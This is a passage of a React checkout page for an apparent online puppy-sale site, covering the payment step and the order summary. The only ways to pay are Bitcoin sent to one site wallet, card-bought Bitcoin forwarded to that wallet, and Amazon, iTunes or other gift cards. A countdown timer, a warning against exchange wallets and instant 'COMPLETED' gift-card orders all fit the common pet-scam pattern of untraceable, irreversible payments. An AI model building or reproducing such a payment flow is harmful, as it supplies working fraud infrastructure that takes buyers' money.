                              className="px-3 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 transition-colors text-sm flex items-center justify-center"
                            >
                              <FaExternalLinkAlt className="mr-1" />
                              Paybis
                            </button>
                            <button
                              onClick={() => redirectToProvider('coinmama')}
                              className="px-3 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500 transition-colors text-sm flex items-center justify-center"
                            >
                              <FaExternalLinkAlt className="mr-1" />
                              CoinMama
                            </button>
                          </div>

                          <div className="flex space-x-3">
                            <button
                              onClick={() => copyToClipboard(walletAddress, 'address')}
                              className="flex-1 px-3 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-500 transition-colors text-sm flex items-center justify-center"
                            >
                              <FaCopy className="mr-1" />
                              Copy Address
                            </button>
                            <button
                              onClick={() => copyToClipboard(`$${getTotalAmount()}`, 'price')}
                              className="flex-1 px-3 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-500 transition-colors text-sm flex items-center justify-center"
                            >
                              <FaDollarSign className="mr-1" />
                              Copy Amount
                            </button>
                          </div>

                          <button
                            onClick={() => setShowPaymentInstructions(false)}
                            className="w-full mt-3 px-4 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500 transition-colors"
                          >
                            Close Instructions
                          </button>
                        </div>
                      </div>
                    )}

                    {/* Terms and Conditions */}
                    <div className="space-y-4">
                      <div className="flex items-start">
                        <input
                          type="checkbox"
                          name="acceptTerms"
                          checked={formData.acceptTerms}
                          onChange={handleInputChange}
                          className="mt-1 mr-3"
                        />
                        <label className="text-sm text-gray-700">
                          I agree to the Terms and Conditions and Privacy Policy *
                        </label>
                      </div>
                      {errors.acceptTerms && (
                        <p className="text-sm text-red-600">{errors.acceptTerms}</p>
                      )}

                      <div className="flex items-start">
                        <input
                          type="checkbox"
                          name="acceptMarketing"
                          checked={formData.acceptMarketing}
                          onChange={handleInputChange}
                          className="mt-1 mr-3"
                        />
                        <label className="text-sm text-gray-700">
                          I would like to receive marketing communications and updates
                        </label>
                      </div>
                    </div>
                  </div>
                )}

                {/* Step 4: Payment Gateway */}
                {currentStep === 4 && (
                  <div>
                    {formData.paymentMethod === 'crypto' ? (
                      // Direct Crypto Payment
                      <>
                        <div className="text-center mb-8">
                          <h1 className="text-2xl font-bold text-gray-900 mb-2">Crypto Payment</h1>
                          <p className="text-gray-600">Send exactly ${ticket.price} of BTC to the address below</p>
                        </div>

                        {/* Countdown Timer */}
                        <div className="mb-6 text-center">
                          <div className="inline-flex items-center px-4 py-2 bg-red-50 rounded-full">
                            <span className="text-red-600 font-mono text-lg font-semibold">
                              ⏰ {formatTime(timeLeft)}
                            </span>
                          </div>
                          <p className="text-sm text-gray-500 mt-2">
                            Complete payment before timer expires
                          </p>
                        </div>

                        {/* QR Code */}
                        <div className="mb-6 text-center">
                          <div className="inline-block p-4 bg-white rounded-lg border border-gray-200">
                            <Image
                              src={'/btc.jpeg'}
                              alt="Bitcoin QR Code"
                              height={500}
                              width={500}
                              className='rounded-[30px]'
                            />
                          </div>
                          <p className="text-sm text-gray-500 mt-2">Scan QR code with your wallet</p>
                        </div>

                        {/* Wallet Address */}
                        <div className="mb-6">
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Wallet Address
                          </label>
                          <div className="flex items-center space-x-2">
                            <input
                              type="text"
                              value={walletAddress}
                              readOnly
                              className="flex-1 px-3 py-2 border border-gray-300 rounded-md text-sm font-mono bg-gray-50 text-gray-700 overflow-x-auto"
                            />
                            <button
                              onClick={() => copyToClipboard(walletAddress, 'address')}
                              className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors flex items-center"
                            >
                              <FaCopy className="mr-2" />
                              {copied ? 'Copied!' : 'Copy'}
                            </button>
                          </div>
                        </div>

                        {/* Payment Amount */}
                        <div className="mb-6">
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Payment Amount
                          </label>
                          <div className="flex items-center space-x-2">
                            <input
                              type="text"
                              value={`$${getTotalAmount()} (${calculateBtcAmount()} BTC)`}
                              readOnly
                              className="flex-1 px-3 py-2 border border-gray-300 rounded-md text-sm font-mono bg-gray-50 text-gray-700"
                            />
                            <button
                              onClick={() => copyToClipboard(`$${getTotalAmount()}`, 'price')}
                              className="px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 transition-colors flex items-center"
                            >
                              <FaDollarSign className="mr-2" />
                              {copiedPrice ? 'Copied!' : 'Copy'}
                            </button>
                          </div>
                        </div>

                        {/* Payment Details */}
                        <div className="bg-gray-50 rounded-lg p-4 mb-6">
                          <h3 className="font-semibold text-gray-900 mb-3">Payment Details</h3>
                          <div className="space-y-2 text-sm">
                            <div className="flex justify-between">
                              <span className="text-gray-600">Amount:</span>
                              <span className="font-mono">${ticket.price} of BTC</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600">Dog:</span>
                              <span className="font-mono">{ticket.dogName} ({ticket.breed})</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600">Network:</span>
                              <span>Bitcoin Mainnet</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600">Status:</span>
                              <span className={`font-semibold ${
                                paymentStatus === 'pending' ? 'text-yellow-600' : 
                                paymentStatus === 'completed' ? 'text-green-600' : 'text-red-600'
                              }`}>
                                {paymentStatus.toUpperCase()}
                              </span>
                            </div>
                          </div>
                        </div>

                        {/* Instructions */}
                        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                          <h4 className="font-semibold text-yellow-800 mb-2">Important Instructions</h4>
                          <ul className="text-sm text-yellow-700 space-y-1">
                            <li>• Send exactly ${ticket.price} of BTC</li>
                            <li>• Use Bitcoin Mainnet only</li>
                            <li>• Do not send from exchange wallets</li>
                            <li>• Transaction may take 2-3 minutes to confirm</li>
                          </ul>
                        </div>

                        {/* Status Indicator */}
                        {paymentStatus === 'expired' && (
                          <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                            <p className="text-red-800 font-semibold text-center">
                              Payment time expired. Please refresh to get a new address.
                            </p>
                          </div>
                        )}
                      </>
                    ) : formData.paymentMethod === 'buy-btc-with-card' ? (
                      // Buy Bitcoin with Card Confirmation
                      <div className="text-center py-8">
                        <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                          <FaCreditCard className="text-blue-600 text-2xl" />
                        </div>
                        <h2 className="text-2xl font-bold text-gray-900 mb-4">
                          Complete Your Bitcoin Purchase
                        </h2>
                        <p className="text-gray-600 mb-6">
                          Follow these steps to complete your payment using any Bitcoin purchase service.
                        </p>
                        
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-6 max-w-md mx-auto">
                          <h3 className="font-semibold text-blue-800 mb-3">Payment Instructions</h3>
                          <div className="space-y-3 text-left text-sm">
                            <div className="flex items-start">
                              <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs mr-3 mt-0.5 flex-shrink-0">1</div>
                              <span>Copy our BTC address and payment amount</span>
                            </div>
                            <div className="flex items-start">
                              <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs mr-3 mt-0.5 flex-shrink-0">2</div>
                              <span>Visit any Bitcoin purchase service (MoonPay, Paybis, etc.)</span>
                            </div>
                            <div className="flex items-start">
                              <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs mr-3 mt-0.5 flex-shrink-0">3</div>
                              <span>Paste our BTC address as the recipient</span>
                            </div>
                            <div className="flex items-start">
                              <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs mr-3 mt-0.5 flex-shrink-0">4</div>
                              <span>Enter amount: <strong>${getTotalAmount()}</strong></span>
                            </div>
                            <div className="flex items-start">
                              <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs mr-3 mt-0.5 flex-shrink-0">5</div>
                              <span>Complete purchase and keep transaction receipt</span>
                            </div>
                          </div>
                          
                          <div className="mt-4 p-3 bg-white rounded border">
                            <div className="flex justify-between items-center mb-2">
                              <span className="text-sm font-semibold">BTC Address:</span>
                              <button
                                onClick={() => copyToClipboard(walletAddress, 'address')}
                                className="text-xs bg-blue-600 text-white px-2 py-1 rounded hover:bg-blue-700 flex items-center"
                              >
                                <FaCopy className="mr-1" />
                                {copied ? 'Copied!' : 'Copy'}
                              </button>
                            </div>
                            <p className="text-xs font-mono break-all text-center bg-gray-50 p-2 rounded">
                              {walletAddress}
                            </p>
                            
                            <div className="flex justify-between items-center mt-3">
                              <span className="text-sm font-semibold">Amount:</span>
                              <button
                                onClick={() => copyToClipboard(`$${getTotalAmount()}`, 'price')}
                                className="text-xs bg-green-600 text-white px-2 py-1 rounded hover:bg-green-700 flex items-center"
                              >
                                <FaDollarSign className="mr-1" />
                                {copiedPrice ? 'Copied!' : 'Copy'}
                              </button>
                            </div>
                            <p className="text-sm text-center font-semibold mt-1">
                              ${getTotalAmount()} (~{calculateBtcAmount()} BTC)
                            </p>
                          </div>
                        </div>

                        <div className="grid grid-cols-2 gap-4 mb-6 max-w-md mx-auto">
                          <button
                            onClick={() => redirectToProvider('moonpay')}
                            className="px-4 py-3 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors flex items-center justify-center"
                          >
                            <FaExternalLinkAlt className="mr-2" />
                            MoonPay
                          </button>
                          <button
                            onClick={() => redirectToProvider('paybis')}
                            className="px-4 py-3 bg-green-600 text-white rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 transition-colors flex items-center justify-center"
                          >
                            <FaExternalLinkAlt className="mr-2" />
                            Paybis
                          </button>
                          <button
                            onClick={() => redirectToProvider('coinmama')}
                            className="px-4 py-3 bg-purple-600 text-white rounded-md hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 transition-colors flex items-center justify-center"
                          >
                            <FaExternalLinkAlt className="mr-2" />
                            CoinMama
                          </button>
                        </div>

                        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 max-w-md mx-auto">
                          <p className="text-sm text-yellow-800 text-center">
                            <strong>Remember:</strong> You must send the Bitcoin to our wallet address shown above. Payment is only complete when we receive the Bitcoin.
                          </p>
                        </div>
                      </div>
                    ) : formData.paymentMethod === 'gift-card' ? (
                      // Gift Card Payment Confirmation
                      <div className="text-center py-8">
                        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                          <FaGift className="text-green-600 text-2xl" />
                        </div>
                        <h2 className="text-2xl font-bold text-gray-900 mb-4">
                          Order Complete! 🎉
                        </h2>
                        <p className="text-gray-600 mb-6">
                          Thank you for your purchase! Your order has been confirmed and emails have been sent to both you and our team.
                        </p>
                        
                        <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6 max-w-md mx-auto">
                          <h3 className="font-semibold text-green-800 mb-3">Order Details</h3>
                          <div className="space-y-2 text-left">
                            <div className="flex justify-between">
                              <span className="text-gray-600">Amount Paid:</span>
                              <span className="font-semibold">${getTotalAmount()}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600">Payment Method:</span>
                              <span>Gift Card</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600">Provider:</span>
                              <span className="capitalize">{formData.giftCardProvider}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600">Status:</span>
                              <span className="text-green-600 font-semibold">COMPLETED</span>
                            </div>
                          </div>
                        </div>

                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6 max-w-md mx-auto">
                          <p className="text-sm text-blue-800 text-center">
                            <strong>Check your email!</strong> We've sent a confirmation to <strong>{formData.email}</strong> 
                            with all the details about your order and next steps.
                          </p>
                        </div>

                        <div className="flex space-x-4 justify-center">
                          <Link
                            href="/"
                            className="px-6 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors"
                          >
                            Return to Home
                          </Link>
                          <button
                            onClick={() => window.print()}
                            className="px-6 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors"
                          >
                            Print Receipt
                          </button>
                        </div>
                      </div>
                    ) : (
                      // External Payment Confirmation
                      <div className="text-center py-8">
                        <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                          <FaGift className="text-blue-600 text-2xl" />
                        </div>
                        <h2 className="text-2xl font-bold text-gray-900 mb-4">
                          Redirecting to Payment Provider
                        </h2>
                        <p className="text-gray-600 mb-6">
                          You've selected {formData.paymentMethod === 'amazon-gift-card' ? 'Amazon Gift Card' : 
                          formData.paymentMethod === 'itunes-gift-card' ? 'iTunes Gift Card' : 
                          'Paybis BTC Purchase'}. Please complete your payment on the external platform.
                        </p>
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                          <p className="text-sm text-blue-800">
                            <strong>Note:</strong> After completing your payment, return to this page and refresh to see your order status.
                          </p>
                        </div>
                        <button
                          onClick={() => window.location.reload()}
                          className="px-6 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                        >
                          Refresh Order Status
                        </button>
                      </div>
                    )}
                  </div>
                )}

                {/* Navigation Buttons */}
                <div className="flex justify-between mt-8">
                  {currentStep > 1 && currentStep < 4 && (
                    <button
                      onClick={handlePreviousStep}
                      className="px-6 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                    >
                      <FaChevronLeft className="inline mr-2" />
                      Back
                    </button>
                  )}
                  
                  {currentStep < 3 && (
                    <button
                      onClick={handleNextStep}
                      className="ml-auto px-6 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                    >
                      Continue
                    </button>
                  )}
                  
                  {currentStep === 3 && formData.paymentMethod !== 'buy-btc-with-card' && (
                    <button
                      onClick={handleSubmit}
                      disabled={isSubmitting || !formData.acceptTerms || (formData.paymentMethod === 'gift-card' && !giftCardVerified)}
                      className="ml-auto px-6 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 disabled:opacity-50"
                    >
                      {isSubmitting ? 'Processing...' : 'Complete Order'}
                    </button>
                  )}
                  
                  {currentStep === 1 && currentStep < 3 && (
                    <div className="ml-auto"></div>
                  )}
                </div>
              </div>
            </div>
          </div>

          {/* Order Summary Sidebar */}
          <div className="lg:col-span-1">
            <div className="bg-white rounded-xl shadow-md p-6 sticky top-4">
              <h3 className="text-lg font-semibold mb-4">Order Summary</h3>
              
              {/* Dog Image and Info */}
              <div className="flex items-center space-x-4 mb-4">
                <div className="w-16 h-16 relative">
                  <Image
                    src={ticket.image}
                    alt={ticket.dogName}
                    fill
                    className="rounded-lg object-cover"
                  />
                </div>
                <div>
                  <h4 className="font-semibold">{ticket.dogName}</h4>
                  <p className="text-sm text-gray-600">{ticket.breed}</p>
                </div>
              </div>
              
              <div className="space-y-3 mb-6">
                <div className="flex justify-between">
                  <span>Dog Price:</span>
                  <span>${ticket.price}</span>
                </div>
                <div className="flex justify-between">
                  <span>Service Fee:</span>
                  <span>$2.50</span>
                </div>
                <div className="flex justify-between">
                  <span>Delivery Fee:</span>
                  <span>$0.00</span>
                </div>
                <hr />
                <div className="flex justify-between font-semibold text-lg">
                  <span>Total:</span>
                  <span>${getTotalAmount()}</span>
                </div>
              </div>

              {/* Selected Payment Method */}
              {currentStep >= 3 && (
                <div className="border-t pt-4">
                  <h4 className="font-semibold mb-2">Payment Method</h4>
                  <p className="text-sm text-gray-600">
                    {formData.paymentMethod === 'crypto' && 'Direct Bitcoin Payment'}
                    {formData.paymentMethod === 'buy-btc-with-card' && 'Buy Bitcoin with Card'}
                    {formData.paymentMethod === 'gift-card' && `Gift Card (${formData.giftCardProvider})`}
                    {formData.paymentMethod === 'amazon-gift-card' && 'Amazon Gift Card'}
                    {formData.paymentMethod === 'itunes-gift-card' && 'iTunes Gift Card'}
                    {formData.paymentMethod === 'paybis-btc' && 'Paybis BTC Purchase'}
                  </p>
                  {formData.paymentMethod === 'gift-card' && giftCardVerified && (
                    <p className="text-sm text-green-600 mt-1">✓ Verified</p>
                  )}
                  {formData.paymentMethod === 'buy-btc-with-card' && (
                    <p className="text-sm text-blue-600 mt-1">External Provider</p>
                  )}
                </div>
              )}

              <div className="border-t pt-4">
                <h4 className="font-semibold mb-2">{ticket.application}</h4>
                <p className="text-sm text-gray-600 mb-1">{ticket.breed}</p>
                <p className="text-sm text-gray-600">{ticket.location}</p>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-sm text-gray-500">
            Need help? Contact support@pawperfect.com
          </p>
        </div>
      </div>
    </div>
  );
};

export default Page;